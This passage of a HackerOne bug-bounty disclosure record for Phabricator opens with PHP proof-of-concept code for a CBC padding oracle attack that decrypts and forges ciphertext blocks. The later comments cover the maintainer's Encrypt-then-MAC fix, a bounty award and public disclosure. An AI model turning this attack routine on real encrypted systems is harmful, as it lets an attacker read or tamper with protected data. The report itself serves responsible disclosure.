class=\"p\">,</span> <span class=\"nv\">$iv</span><span class=\"p\">);</span>\n  <span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;ORACLE ATTACK (RAW)&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$result</span><span class=\"p\">);</span>\n  <span class=\"nx\">print_section</span><span class=\"p\">(</span><span class=\"s1\">&#39;ORACLE ATTACK (BYTES)&#39;</span><span class=\"p\">,</span> <span class=\"nv\">$result</span><span class=\"p\">,</span> <span class=\"kc\">true</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">function</span> <span class=\"nf\">oracle_decrypt_attack_block</span><span class=\"p\">(</span>\n  <span class=\"nv\">$head_block</span><span class=\"p\">,</span>\n  <span class=\"nv\">$tail_block</span><span class=\"p\">,</span>\n  <span class=\"nv\">$oracle</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n\n  <span class=\"k\">echo</span> <span class=\"s2\">&quot;Performing oracle decryption attack against target block...</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">;</span>\n\n  <span class=\"nv\">$plaintext</span> <span class=\"o\">=</span> <span class=\"nb\">array_fill</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$byte</span> <span class=\"o\">=</span> <span class=\"mi\">15</span><span class=\"p\">;</span> <span class=\"nv\">$byte</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nv\">$byte</span><span class=\"o\">--</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$raw_value</span> <span class=\"o\">=</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$head_block</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">]);</span>\n    <span class=\"nv\">$pad_value</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"mi\">16</span> <span class=\"o\">-</span> <span class=\"nv\">$byte</span><span class=\"p\">);</span>\n\n    <span class=\"nv\">$try_head</span> <span class=\"o\">=</span> <span class=\"nv\">$head_block</span><span class=\"p\">;</span>\n\n    <span class=\"c1\">// If we&#39;ve already guessed some plaintext bytes, first configure the\n</span>    <span class=\"c1\">// end of the block to have the right values for those bytes.\n</span>    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$ii</span> <span class=\"o\">=</span> <span class=\"mi\">15</span><span class=\"p\">;</span> <span class=\"nv\">$ii</span> <span class=\"o\">&gt;</span> <span class=\"nv\">$byte</span><span class=\"p\">;</span> <span class=\"nv\">$ii</span><span class=\"o\">--</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nv\">$attack_value</span> <span class=\"o\">=</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$head_block</span><span class=\"p\">[</span><span class=\"nv\">$ii</span><span class=\"p\">])</span> <span class=\"o\">^</span> <span class=\"nv\">$plaintext</span><span class=\"p\">[</span><span class=\"nv\">$ii</span><span class=\"p\">]</span> <span class=\"o\">^</span> <span class=\"nv\">$pad_value</span><span class=\"p\">;</span>\n      <span class=\"nv\">$try_head</span><span class=\"p\">[</span><span class=\"nv\">$ii</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nv\">$attack_value</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"c1\">// Now, guess the last byte, using the padding oracle to verify the value\n</span>    <span class=\"c1\">// for the plaintext.\n</span>    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$guess_byte</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nv\">$guess_byte</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">255</span><span class=\"p\">;</span> <span class=\"nv\">$guess_byte</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nv\">$try_head</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nv\">$raw_value</span> <span class=\"o\">^</span> <span class=\"nv\">$guess_byte</span> <span class=\"o\">^</span> <span class=\"nv\">$pad_value</span><span class=\"p\">);</span>\n\n      <span class=\"nv\">$ok</span> <span class=\"o\">=</span> <span class=\"nx\">query_oracle</span><span class=\"p\">(</span><span class=\"nv\">$try_head</span><span class=\"o\">.</span><span class=\"nv\">$tail_block</span><span class=\"p\">,</span> <span class=\"nv\">$oracle</span><span class=\"p\">);</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$ok</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nb\">printf</span><span class=\"p\">(</span>\n          <span class=\"s2\">&quot;Solved byte %d.</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">,</span>\n          <span class=\"nv\">$byte</span><span class=\"p\">);</span>\n        <span class=\"nv\">$plaintext</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nv\">$guess_byte</span><span class=\"p\">;</span>\n        <span class=\"k\">break</span><span class=\"p\">;</span>\n      <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"k\">echo</span> <span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">;</span>\n\n  <span class=\"c1\">// Convert the plaintext back to a string and return it.\n</span>  <span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;&#39;</span><span class=\"p\">;</span>\n  <span class=\"k\">foreach</span> <span class=\"p\">(</span><span class=\"nv\">$plaintext</span> <span class=\"k\">as</span> <span class=\"nv\">$ord</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$result</span> <span class=\"o\">.=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nv\">$ord</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"k\">return</span> <span class=\"nv\">$result</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">function</span> <span class=\"nf\">oracle_encrypt_attack_block</span><span class=\"p\">(</span>\n  <span class=\"nv\">$head_block</span><span class=\"p\">,</span>\n  <span class=\"nv\">$tail_block</span><span class=\"p\">,</span>\n  <span class=\"nv\">$oracle</span><span class=\"p\">,</span>\n  <span class=\"nv\">$plain_block</span><span class=\"p\">,</span>\n  <span class=\"nv\">$evil_block</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n\n  <span class=\"k\">echo</span> <span class=\"s2\">&quot;Performing oracle encryption attack against target block...</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">;</span>\n\n  <span class=\"nv\">$ciphertext</span> <span class=\"o\">=</span> <span class=\"nb\">array_fill</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">16</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">);</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$byte</span> <span class=\"o\">=</span> <span class=\"mi\">15</span><span class=\"p\">;</span> <span class=\"nv\">$byte</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nv\">$byte</span><span class=\"o\">--</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$raw_value</span> <span class=\"o\">=</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$head_block</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">]);</span>\n    <span class=\"nv\">$pad_value</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"mi\">16</span> <span class=\"o\">-</span> <span class=\"nv\">$byte</span><span class=\"p\">);</span>\n\n    <span class=\"nv\">$try_head</span> <span class=\"o\">=</span> <span class=\"nv\">$head_block</span><span class=\"p\">;</span>\n\n    <span class=\"nv\">$known_value</span> <span class=\"o\">=</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$plain_block</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">]);</span>\n    <span class=\"nv\">$evil_value</span> <span class=\"o\">=</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$evil_block</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">]);</span>\n\n    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$ii</span> <span class=\"o\">=</span> <span class=\"mi\">15</span><span class=\"p\">;</span> <span class=\"nv\">$ii</span> <span class=\"o\">&gt;</span> <span class=\"nv\">$byte</span><span class=\"p\">;</span> <span class=\"nv\">$ii</span><span class=\"o\">--</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nv\">$attack_value</span> <span class=\"o\">=</span>\n        <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$head_block</span><span class=\"p\">[</span><span class=\"nv\">$ii</span><span class=\"p\">])</span> <span class=\"o\">^</span>\n        <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$plain_block</span><span class=\"p\">[</span><span class=\"nv\">$ii</span><span class=\"p\">])</span> <span class=\"o\">^</span>\n        <span class=\"nv\">$pad_value</span><span class=\"p\">;</span>\n\n      <span class=\"nv\">$try_head</span><span class=\"p\">[</span><span class=\"nv\">$ii</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nv\">$attack_value</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"nv\">$solved</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">;</span>\n    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$guess_byte</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nv\">$guess_byte</span> <span class=\"o\">&lt;=</span> <span class=\"mi\">255</span><span class=\"p\">;</span> <span class=\"nv\">$guess_byte</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nv\">$guess_value</span> <span class=\"o\">=</span>\n        <span class=\"nv\">$raw_value</span> <span class=\"o\">^</span>\n        <span class=\"nv\">$guess_byte</span> <span class=\"o\">^</span>\n        <span class=\"nv\">$pad_value</span> <span class=\"o\">^</span>\n        <span class=\"nv\">$known_value</span> <span class=\"o\">^</span>\n        <span class=\"nv\">$evil_value</span><span class=\"p\">;</span>\n\n      <span class=\"nv\">$try_head</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nv\">$guess_value</span><span class=\"p\">);</span>\n\n      <span class=\"nv\">$ok</span> <span class=\"o\">=</span> <span class=\"nx\">query_oracle</span><span class=\"p\">(</span><span class=\"nv\">$try_head</span><span class=\"o\">.</span><span class=\"nv\">$tail_block</span><span class=\"p\">,</span> <span class=\"nv\">$oracle</span><span class=\"p\">);</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$ok</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nv\">$solved</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"p\">;</span>\n        <span class=\"nb\">printf</span><span class=\"p\">(</span>\n          <span class=\"s2\">&quot;Solved byte %d.</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">,</span>\n          <span class=\"nv\">$byte</span><span class=\"p\">);</span>\n\n        <span class=\"nv\">$ciphertext</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$try_head</span><span class=\"p\">[</span><span class=\"nv\">$byte</span><span class=\"p\">])</span> <span class=\"o\">^</span> <span class=\"nv\">$pad_value</span> <span class=\"o\">^</span> <span class=\"nv\">$evil_value</span><span class=\"p\">;</span>\n\n        <span class=\"k\">break</span><span class=\"p\">;</span>\n      <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nv\">$solved</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"k\">die</span><span class=\"p\">(</span><span class=\"s2\">&quot;Unable to solve byte </span><span class=\"si\">{</span><span class=\"nv\">$byte</span><span class=\"si\">}</span><span class=\"s2\">.</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"k\">echo</span> <span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">;</span>\n\n  <span class=\"c1\">// Convert the plaintext back to a string and return it.\n</span>  <span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;&#39;</span><span class=\"p\">;</span>\n  <span class=\"k\">foreach</span> <span class=\"p\">(</span><span class=\"nv\">$ciphertext</span> <span class=\"k\">as</span> <span class=\"nv\">$ord</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nv\">$result</span> <span class=\"o\">.=</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nv\">$ord</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"k\">return</span> <span class=\"nv\">$result</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">function</span> <span class=\"nf\">query_oracle</span><span class=\"p\">(</span><span class=\"nv\">$guess</span><span class=\"p\">,</span> <span class=\"nv\">$oracle</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nv\">$key</span> <span class=\"o\">=</span> <span class=\"nv\">$oracle</span><span class=\"p\">[</span><span class=\"s1\">&#39;key&#39;</span><span class=\"p\">];</span>\n  <span class=\"nv\">$iv</span> <span class=\"o\">=</span> <span class=\"nv\">$oracle</span><span class=\"p\">[</span><span class=\"s1\">&#39;iv&#39;</span><span class=\"p\">];</span>\n  <span class=\"nv\">$ok</span> <span class=\"o\">=</span> <span class=\"nb\">openssl_decrypt</span><span class=\"p\">(</span><span class=\"nv\">$guess</span><span class=\"p\">,</span> <span class=\"nx\">CIPHER</span><span class=\"p\">,</span> <span class=\"nv\">$key</span><span class=\"p\">,</span> <span class=\"nx\">OPENSSL_RAW_DATA</span><span class=\"p\">,</span> <span class=\"nv\">$iv</span><span class=\"p\">);</span>\n\n  <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"nv\">$ok</span> <span class=\"o\">!==</span> <span class=\"kc\">false</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">function</span> <span class=\"nf\">get_random_bytes</span><span class=\"p\">(</span><span class=\"nv\">$length</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nv\">$src</span> <span class=\"o\">=</span> <span class=\"nb\">fopen</span><span class=\"p\">(</span><span class=\"s1\">&#39;/dev/urandom&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;rb&#39;</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$src</span> <span class=\"o\">===</span> <span class=\"kc\">false</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">die</span><span class=\"p\">(</span><span class=\"s1\">&#39;Failed to open /dev/urandom.&#39;</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"nb\">fread</span><span class=\"p\">(</span><span class=\"nv\">$src</span><span class=\"p\">,</span> <span class=\"nv\">$length</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$result</span> <span class=\"o\">===</span> <span class=\"kc\">false</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">die</span><span class=\"p\">(</span><span class=\"s1\">&#39;Failed to read /dev/urandom.&#39;</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n\n  <span class=\"nb\">fclose</span><span class=\"p\">(</span><span class=\"nv\">$src</span><span class=\"p\">);</span>\n\n  <span class=\"k\">return</span> <span class=\"nv\">$result</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">function</span> <span class=\"nf\">print_section</span><span class=\"p\">(</span><span class=\"nv\">$header</span><span class=\"p\">,</span> <span class=\"nv\">$body</span><span class=\"p\">,</span> <span class=\"nv\">$binary</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">echo</span> <span class=\"nv\">$header</span><span class=\"p\">;</span>\n  <span class=\"k\">echo</span> <span class=\"s2\">&quot;</span><span class=\"se\">\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">;</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$binary</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"nv\">$ii</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nv\">$ii</span> <span class=\"o\">&lt;</span> <span class=\"nb\">strlen</span><span class=\"p\">(</span><span class=\"nv\">$body</span><span class=\"p\">);</span> <span class=\"nv\">$ii</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nb\">printf</span><span class=\"p\">(</span><span class=\"s1\">&#39;0x%02x &#39;</span><span class=\"p\">,</span> <span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"nv\">$body</span><span class=\"p\">[</span><span class=\"nv\">$ii</span><span class=\"p\">]));</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n    <span class=\"k\">echo</span> <span class=\"nv\">$body</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">echo</span> <span class=\"s2\">&quot;</span><span class=\"se\">\\n\\n</span><span class=\"s2\">&quot;</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</code></pre>", 
            "type": "Activities::BugTriaged", 
            "id": 1573568, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-01T09:34:55.769Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-01T09:34:55.769Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Very nice CBC padding oracle attack demonstration. When I find time, I will play around with your PoC and see how much I can speed up the attack.", 
            "markdown_message": "<p>Very nice CBC padding oracle attack demonstration. When I find time, I will play around with your PoC and see how much I can speed up the attack.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1577263, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-02T16:35:16.926Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-02T16:35:16.926Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Just to follow up quickly since I didn't get this fixed on the optimistic timeline I was hoping to above: this is still near the top of my TODO list, some other stuff has just been cropping up so I haven't made it here yet. I still expect to fix this in the short term.", 
            "markdown_message": "<p>Just to follow up quickly since I didn&#39;t get this fixed on the optimistic timeline I was hoping to above: this is still near the top of my TODO list, some other stuff has just been cropping up so I haven&#39;t made it here yet. I still expect to fix this in the short term.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1579017, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-05T19:11:29.754Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T19:11:29.754Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I believe this should now be resolved at HEAD of `master`:\n\nhttps://secure.phabricator.com/D17625\nhttps://secure.phabricator.com/rP63828f580689b7799d8d38ed4604e91385f33505\nhttps://secure.phabricator.com/T12470\n\nBriefly, I've implemented Encrypt-then-MAC for encrypted files, hashing both the encrypted data and the IV to generate an integrity hash. Unencrypted files also get a basic integrity hash of the file data.\n\nIn both cases, we refuse to decrypt or serve file data if the stored integrity hash does not match a freshly computed integrity hash after we perform a read from the underlying storage engine, so execution never reaches the decryption step and the process can no longer serve as a padding oracle.\n\nI plan to make some other followup changes (like providing CLI tools for related maintenance) and we'll offer further guidance in the weekly changelog, but none of the additional work needs to hold up resolving this issue.\n\nIf you have a chance to review the fix, please let us know if you catch any issues with it.", 
            "markdown_message": "<p>I believe this should now be resolved at HEAD of <code>master</code>:</p>\n\n<p><a title=\"https://secure.phabricator.com/D17625\" href=\"/redirect?signature=6e340705c82a6090547a5dbd0e7a293aa0036979&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FD17625\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/D17625</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://secure.phabricator.com/rP63828f580689b7799d8d38ed4604e91385f33505\" href=\"/redirect?signature=8ac6ba1352255f30ead9b96e264111779991ff4f&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FrP63828f580689b7799d8d38ed4604e91385f33505\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/rP63828f580689b7799d8d38ed4604e91385f33505</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"https://secure.phabricator.com/T12470\" href=\"/redirect?signature=039b59c64c0e15d6e4776f30187244b9ddb7f440&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FT12470\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/T12470</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Briefly, I&#39;ve implemented Encrypt-then-MAC for encrypted files, hashing both the encrypted data and the IV to generate an integrity hash. Unencrypted files also get a basic integrity hash of the file data.</p>\n\n<p>In both cases, we refuse to decrypt or serve file data if the stored integrity hash does not match a freshly computed integrity hash after we perform a read from the underlying storage engine, so execution never reaches the decryption step and the process can no longer serve as a padding oracle.</p>\n\n<p>I plan to make some other followup changes (like providing CLI tools for related maintenance) and we&#39;ll offer further guidance in the weekly changelog, but none of the additional work needs to hold up resolving this issue.</p>\n\n<p>If you have a chance to review the fix, please let us know if you catch any issues with it.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1585639, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "edoverflow", 
                "url": "/edoverflow"
            }, 
            "created_at": "2017-04-05T19:11:54.917Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T19:11:54.917Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Per above, this is now fixed in HEAD of `master`.", 
            "markdown_message": "<p>Per above, this is now fixed in HEAD of <code>master</code>.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1585641, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-04-05T19:19:02.572Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T19:19:02.572Z", 
            "actor": {
                "url": "/phabricator", 
                "profile": {
                    "name": "Phabricator"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/018/29aa105aca62b26e62c64e57c902e5db2bb8daf6_medium.jpg?1487955532"
                }
            }, 
            "team_handle": "phabricator", 
            "bonus_amount": "0.0", 
            "bounty_amount": "750.0", 
            "collaborator": {
                "username": "edoverflow", 
                "url": "/edoverflow"
            }, 
            "message": "Although the severity of this issue isn't especially high, I'm also considering the work that went into discussing this report and helping to develop an understanding of the issue in assessing an award.", 
            "markdown_message": "<p>Although the severity of this issue isn&#39;t especially high, I&#39;m also considering the work that went into discussing this report and helping to develop an understanding of the issue in assessing an award.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1585662, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-05T19:19:38.270Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T19:19:38.270Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "first_to_agree": true, 
            "message": "Details of this issue are now publicly available in the upstream bug tracker and commit history, so it can be disclosed at any time.", 
            "markdown_message": "<p>Details of this issue are now publicly available in the upstream bug tracker and commit history, so it can be disclosed at any time.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1585666, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-05T19:25:14.784Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T19:25:14.784Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Also, thanks for your patience while the issue was resolved -- we try to turn fixes around much faster than this, but this was a bit of an unusual case with some competing priorities and a technical pathway partially blocked by some other outstanding bugs.\n\nLet us know if you catch anything I missed or find any other issues in the future. Thanks again!", 
            "markdown_message": "<p>Also, thanks for your patience while the issue was resolved -- we try to turn fixes around much faster than this, but this was a bit of an unusual case with some competing priorities and a technical pathway partially blocked by some other outstanding bugs.</p>\n\n<p>Let us know if you catch anything I missed or find any other issues in the future. Thanks again!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1585692, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-05T19:51:18.875Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T19:51:18.875Z", 
            "actor": {
                "username": "edoverflow", 
                "url": "/edoverflow", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Thank you very much for the bounty! It was a pleasure to work with you. I will give you a shout-out on Twitter and let everyone know that you did a fantastic job.\n\nI had a look at the patch and I have one quick question. Are you using [SHA-1](https://github.com/phacility/phabricator/blob/master/src/infrastructure/util/PhabricatorHash.php#L25) for the digest algorithm? While I know that HMAC-SHA-1 is not broken, I would still be inclined to use HMAC-SHA-256. \n\nP.S.: I like the fact that you also check unencrypted files.", 
            "markdown_message": "<p>Thank you very much for the bounty! It was a pleasure to work with you. I will give you a shout-out on Twitter and let everyone know that you did a fantastic job.</p>\n\n<p>I had a look at the patch and I have one quick question. Are you using <a href=\"/redirect?signature=2e2aa1bf3f70a21060deb8f7cadf280e2de82fea&amp;url=https%3A%2F%2Fgithub.com%2Fphacility%2Fphabricator%2Fblob%2Fmaster%2Fsrc%2Finfrastructure%2Futil%2FPhabricatorHash.php%23L25\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>SHA-1</span><i class=\"icon-external-link\"></i></a> for the digest algorithm? While I know that HMAC-SHA-1 is not broken, I would still be inclined to use HMAC-SHA-256. </p>\n\n<p>P.S.: I like the fact that you also check unencrypted files.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1585733, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-05T20:09:10.888Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-05T20:09:10.888Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
